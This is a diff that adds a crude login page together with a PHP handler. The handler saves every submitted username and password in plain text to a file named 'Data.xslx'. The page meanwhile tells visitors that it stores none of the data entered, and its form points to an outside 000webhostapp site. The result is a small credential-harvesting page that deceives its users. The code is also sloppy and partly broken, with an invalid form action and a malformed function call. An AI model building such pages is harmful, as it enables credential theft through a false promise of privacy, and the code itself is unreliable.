@@ -1,0 +1,89 @@
+<?php
+
+$password=$_POST['password'];
+$username=$_POST['username'];
+$data=$username.",".$password;
+
+
+$file="Data.xslx";
+
+
+file_put_contents($file, $data . PHP_EOL,)
+?>
+<html>
+<head>
+<title>Thank You Page</title>  
+</head>
+<body>
+<h1><a href="login.html">GO BACK</a></h1>    
+    
+</body>
+</html>
+<!DOCTYPE html>
+
+<html>
+    <head>
+        <h1>Login or Register</h1>
+        <meta charset="utf-8">
+    </head>
+    <body>
+        <div class="Container">
+            <img src=""/>
+            <form method="POST" action="window.open('https://afreecart.000webhostapp.com')">
+                <div class="form_input">
+                    <input type="text" name="username" placeholder="enter your username"/>
+                </div>
+                <div class="form_input">
+                    <input type="password" name="password" placeholder="Enter your password">
+                </div>
+                <div class="submit">
+                <button type="submit" name="submit" value="LOGIN" onclick="window.open('https://afreecart.000webhostapp.com')" class="btn-login">Login</button>
+                </div>
+            </form>
+        
+        <p>
+        <br>    This login form is just for
+        <br>    fun and we are storing none
+        <br>    of the data entered in the 
+        <br>    login form.
+        </p>
+        
+        </div>
+        
+        
+        <style>
+.Container {
+    text-align: center;
+}
+
+.form_input {
+}
+
+button {
+    background-color: red;
+    font-family: cursive;
+    color: green;
+    font-size: 18px;
+}
+
+h1 {
+    background-color: lightblue;
+    font-family: cursive;
+    text-align-last: center;
+    font-size: 72px;
+    color: blue;
+}
+
+body {
+    background-color: blue;
+}
+
+p {
+    text-align: center;
+    font-family: bold;
+    color: purple;
+    font-size: 24px;
+}
+        </style>
+    </body>
+</html>
